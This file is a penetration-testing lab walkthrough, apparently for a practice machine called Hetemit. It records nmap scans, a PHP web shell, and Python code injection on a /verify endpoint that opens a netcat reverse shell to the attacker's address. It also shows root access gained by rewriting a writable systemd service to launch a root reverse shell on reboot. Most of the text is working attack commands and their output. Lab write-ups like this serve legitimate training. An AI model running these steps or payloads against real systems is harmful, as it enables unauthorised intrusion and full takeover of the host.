@@ -1,0 +1,162 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.157.117 > Hetemit.txt
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 192.168.45.242
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
+|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
+|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
+80/tcp    open  http        Apache httpd 2.4.37 ((centos))
+|_http-server-header: Apache/2.4.37 (centos)
+|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
+| http-methods: 
+|   Supported Methods: HEAD GET POST OPTIONS TRACE
+|_  Potentially risky methods: TRACE
+139/tcp   open  netbios-ssn Samba smbd 4
+445/tcp   open  netbios-ssn Samba smbd 4
+18000/tcp open  biimenu?
+| fingerprint-strings: 
+|   GenericLines: 
+|     HTTP/1.1 400 Bad Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 403 Forbidden
+|     Content-Type: text/html; charset=UTF-8
+|     Content-Length: 3102
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta charset="utf-8" />
+|     <title>Action Controller: Exception caught</title>
+|     <style>
+|     body {
+|     background-color: #FAFAFA;
+|     color: #333;
+|     margin: 0px;
+|     body, p, ol, ul, td {
+|     font-family: helvetica, verdana, arial, sans-serif;
+|     font-size: 13px;
+|     line-height: 18px;
+|     font-size: 11px;
+|     white-space: pre-wrap;
+|     pre.box {
+|     border: 1px solid #EEE;
+|     padding: 10px;
+|     margin: 0px;
+|     width: 958px;
+|     header {
+|     color: #F0F0F0;
+|     background: #C52F24;
+|     padding: 0.5em 1.5em;
+|     margin: 0.2em 0;
+|     line-height: 1.1em;
+|     font-size: 2em;
+|     color: #C52F24;
+|     line-height: 25px;
+|     .details {
+|_    bord
+50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
+| http-methods: 
+|_  Supported Methods: HEAD GET OPTIONS
+|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+
+Service Info: OS: Unix
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2026-05-15T06:36:43
+|_  start_date: N/A
+
+$ enum4linux -a 192.168.157.117
+cmeeks
+port 80
+/var/www/html/
+/etc/httpd/conf.d/welcome.conf
+
+port 50000
+{'/generate', '/verify'}
+:50000/generate
+{'email@domain'}
+:50000/verify
+{'code'}
+
+port 18000
+$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
+# try upload a shell.php in register page.
+http://192.168.157.117:18000/uploads/shell.php
+# It shows massive info about Routing Error like rails.root, Path/Url
+http://192.168.157.117:18000/rails/info/properties
+Application root	/home/cmeeks/register_hetemit
+Environment	development
+Database adapter	postgresql
+
+curl -X POST --data "code=2*2" http://192.168.157.117:50000/verify
+4
+curl -X POST --data "code=os" http://192.168.157.117:50000/verify
+<module 'os' from '/usr/lib64/python3.6/os.py'>
+
+$ curl -X POST --data 'code=os.system("nc 192.168.45.242 21 -e /bin/bash")' http://192.168.157.117:50000/verify
+# If NameError: name 'os' is not defined, can try:
+code=__import__('os').system("nc 192.168.45.242 21 -e /bin/bash")
+
+$ nc -nlvp 21   
+listening on [any] 21 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.157.117] 55524
+id
+uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)
+
+sudo -l 
+User cmeeks may run the following commands on hetemit:
+    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+
+Linpeas.sh
+You have write privileges over /etc/systemd/system/pythonapp.service
+
+cat /etc/systemd/system/pythonapp.service
+then change it as below:
+echo "[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=nc 192.168.45.242 18000 -e /bin/bash  # payload 
+TimeoutSec=30
+RestartSec=15s
+User=root # change user to root
+ExecReload=/bin/kill -USR1 
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/pythonapp.service
+
+sudo /sbin/reboot
+
+$ rlwrap nc -nlvp 18000
+listening on [any] 18000 ...
+connect to [192.168.45.242] from (UNKNOWN) [192.168.157.117] 46124
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+#######################################################################
+Other possible way:
+Sudo version 1.8.29
